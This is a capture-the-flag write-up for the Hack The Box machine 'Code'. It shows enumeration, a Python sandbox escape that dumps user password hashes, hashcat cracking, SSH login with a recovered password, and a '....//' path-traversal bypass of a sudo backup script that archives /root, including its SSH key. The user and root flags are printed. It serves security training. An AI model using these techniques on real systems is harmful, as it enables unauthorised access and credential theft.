---
title: Code
date: 2025-08-03 21:23:00 +0100
categories: [ctf, htb]
tags: [web, linux, python, json] 
image: https://res.cloudinary.com/djo6idowf/image/upload/v1751662416/Code_ppvocl.png
---
[Code](https://app.hackthebox.com/machines/Code) is an Easy machine released on 22nd March 2025 on Hack The Box.

User Flag: `1b13fd9c1254940b4ecb2cec6840c7e5`

Root Flag: `d8a3aaa8ff453cd616245b41194de75e`

## Write-up

`nmap -A -T4 10.10.11.62`

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-03 15:23 EDT
Nmap scan report for 10.10.11.62
Host is up (0.020s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   16.00 ms 10.10.14.1
2   16.00 ms 10.10.11.62

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.17 seconds
```

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662417/image_u0ypdh.png)

So we have an online IDE. Not sure at this point what the point is but best to make an account and check it out.

[`http://10.10.11.62:5000/login`](http://10.10.11.62:5000/login)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662419/image_zgib7w.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662421/image_doapea.png)

[`http://10.10.11.62:5000/codes`](http://10.10.11.62:5000/codes)

So there seems to be a few pages. Best to run do some directory searching and just see what we have. Oh and also add the IP to `/etc/hosts` so we don’t have to work with an IP.

`gobuster dir -u http://code.htb:5000 -w /usr/share/wordlists/dirb/common.txt`

```
/about                (Status: 200) [Size: 818]
/codes                (Status: 302) [Size: 199] [--> /login]
/login                (Status: 200) [Size: 730]
/logout               (Status: 302) [Size: 189] [--> /]
/register             (Status: 200) [Size: 741]
```

Fairly normal and expected results. Let’s test the save functionality.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662423/image_fbh9m3.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662425/image_fikvxt.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662426/image_npyjus.png)

If you click it it just goes back to the IDE - fairly normal. Checking some Burp requests….

```
GET /?code_id=2 HTTP/1.1
Host: code.htb:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://code.htb:5000/codes
Cookie: session=.eJx1jrEKAjEQRH9l3PqwsfMPBAuxEzmONVnjQi6BbKKI3L97V4pcNcXMG96Hhntke4jR_voh1DloFDMOQh1dcsPYrOImiDkE8dCEmvFUeeGdW4HLXmxL_dT944f05KgeroiXVJWjbXGKwiao5Q0OrGmFPUtQq4Wr5gRrzs3NvcUNFifHCSm_FiesPhxz0B90nvUdNZMyqKf9bvoCAN1WdQ.aGbaxQ.SLJKWV9BQLyvI8bKHkLIszwS0bw
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

`/?code_id=2` sticks out to me as odd. Making a mental note of that one.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662428/image_hswq0m.png)

Tried to print out `/etc/passwd` - but it appears to get blocked because of keywords - possibly the directory. The request is also sent in a web requests that we can view in Burp.

```
POST /run_code HTTP/1.1
Host: code.htb:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 102
Origin: http://code.htb:5000
Connection: keep-alive
Referer: http://code.htb:5000/?code_id=2
Cookie: session=.eJx1jrEKAjEQRH9l3PqwsfMPBAuxEzmONVnjQi6BbKKI3L97V4pcNcXMG96Hhntke4jR_voh1DloFDMOQh1dcsPYrOImiDkE8dCEmvFUeeGdW4HLXmxL_dT944f05KgeroiXVJWjbXGKwiao5Q0OrGmFPUtQq4Wr5gRrzs3NvcUNFifHCSm_FiesPhxz0B90nvUdNZMyqKf9bvoCAN1WdQ.aGbaxQ.SLJKWV9BQLyvI8bKHkLIszwS0bw
Priority: u=0

code=with+open('%2Fetc%2Fpasswd'%2C+'r')+as+file%3A%0A++++content+%3D+file.read()%0A++++print(content)
```

`code=with+open('%2Fetc%2Fpasswd'%2C+'r')+as+file%3A%0A++++content+%3D+file.read()%0A++++print(content)`

Ok so it doesn’t like the use of any kind of standard files or `os` commands from Python.

Going back to the Nmap scan, port `5000` mentions Gunicorn. Doing some Googling revealed that this is related to Flask. I’ve used Flask in the past and it’s basically Python web server. I found that there is a database in Flask/SQLAlchemy called `User.query.all()` which a bunch of data about users. We can then formulate a request (thanks ChatGPT) to dump out all of the user data that this database holds. Because the command is completely unrelated to directories or common Python commands relating to operating system interactions it simply parses it and away it goes.

`print([([user.id](http://user.id/), user.username, user.password) for user in User.query.all()])`

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662431/image_mh8nso.png)

```
[(1, 'development', '759b74ce43947f5f4c91aeddc3e5bad3'), (2, 'martin', '3de6f30c4a09c27fc71932bfc68474be')]
```

Hashes - cool, let’s crack.

`hashcat -m 0 -a 0 --username hashes.txt /usr/share/wordlists/rockyou.txt`

```
759b74ce43947f5f4c91aeddc3e5bad3:development              
3de6f30c4a09c27fc71932bfc68474be:nafeelswordsmaster
```

`development` wasn’t a valid SSH login, but `martin` was.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662433/image_yz4ux2.png)

As always, check what commands can be run as `sudo` .

`sudo -l`

```
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

`(ALL : ALL) NOPASSWD: /usr/bin/backy.sh`

`cat /usr/bin/backy.sh`

```bash
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```

It’s not hugely useful but it references a file called `task.json` but doesn’t give us the directory so we’ll have to search for it.

`find / -name "task.json" 2>/dev/null`

`/home/martin/backups/task.json`

```json
{
        "destination": "/home/martin/backups/",
        "multiprocessing": true,
        "verbose_log": false,
        "directories_to_archive": [
                "/home/app-production/app"
        ],

        "exclude": [
                ".*"
        ]
}
```

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662438/image_l7a7ll.png)

There’s actually an archived file here as well, which probably needs to be extracted.

`tar -xvjf code_home_app-production_app_2024_August.tar.bz2`

```bash
home/app-production/app/
home/app-production/app/app.py
home/app-production/app/static/
home/app-production/app/static/css/
home/app-production/app/static/css/styles.css
home/app-production/app/templates/
home/app-production/app/templates/index.html
home/app-production/app/templates/codes.html
home/app-production/app/templates/register.html
home/app-production/app/templates/login.html
home/app-production/app/templates/about.html
home/app-production/app/instance/
home/app-production/app/instance/database.db
```

I still can’t see any flags. However, going back to `task.json` it does mention an archive but it archives `/app` . Since we have sudo on `backy.sh` maybe we can change the script to archive `user.txt` and then extract it?

```json
"directories_to_archive": [
                "/home/app-production/app"
```

`nano task.json`

```json
"directories_to_archive": [
                "/home/app-production/user.txt"
```

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662440/image_jbt8lt.png)

That’s creating a new archive called `code_home_app-production_user.txt_2025_July.tar.bz2` which we can now extract.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662442/image_zvdtwq.png)

Right, so is the logic of this challenge to then attempt to do the same thing to `root.txt` ?

```json
"directories_to_archive": [
                "/home/app-production/root.txt"
```

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662444/image_rvvubt.png)

OK. Going back to [`backy.sh`](http://backy.sh) there is an interesting line in there - `allowed_paths=("/var/" "/home/")` . So we might be able to change `task.json` to archive `/home/martin/` .

```json
{
  "destination": "/home/martin/",
  "multiprocessing": true,
  "verbose_log": false,
  "directories_to_archive": [
    "/home/root/"
  ],
  "exclude": [
    ".*"
  ]
}
```

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662445/image_xcumud.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662448/image_indkgn.png)

Ok, that didn’t seem to work - possibly because `task.json` isn’t in `martin` home directory. Having a lot of errors with this.

It doesn’t like my attempts to find `/root` . I tried just `/root/` and got `Error: /root/ is not allowed. Only directories under /var/ and /home/ are allowed.` . It wants `/home/` and then we need to find a bypass to get it to archive `/root` .

```
tar: Removing leading `/' from member names
tar: /home//root: Cannot stat: No such file or directory
```

I tried the below bypass and it also didn’t like that.

```json
{
  "destination": "/home/martin/",
  "multiprocessing": true,
  "verbose_log": true,
  "directories_to_archive": [
    "/home/....//root/"
  ],
  "exclude": [
    ".*"
  ]
}
```

Ok. I tried the above about 10 times and couldn’t figure out why it wasn’t working so I removed the `exclude` part - and after about a dozen more tries it worked.

```json
{
  "destination": "/home/martin/",
  "multiprocessing": true,
  "verbose_log": true,
  "directories_to_archive": [
    "/home/....//root/"
  ]
}
```

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662450/image_hk2jat.png)

```
martin@code:~$ tar -xvjf code_home_.._root_2025_July.tar.bz2 
root/
root/.local/
root/.local/share/
root/.local/share/nano/
root/.local/share/nano/search_history
root/.selected_editor
root/.sqlite_history
root/.profile
root/scripts/
root/scripts/cleanup.sh
root/scripts/backups/
root/scripts/backups/task.json
root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2
root/scripts/database.db
root/scripts/cleanup2.sh
root/.python_history
root/root.txt
root/.cache/
root/.cache/motd.legal-displayed
root/.ssh/
root/.ssh/id_rsa
root/.ssh/authorized_keys
root/.bash_history
root/.bashrc
```

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662452/image_hxjlxt.png)

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751662454/Screenshot_2025-07-04_214141_lorkzd.png)

## Thoughts

A fairly unique challenge. I wasn’t particularly into it if I’m honest just simply because the premise is quite unrealistic.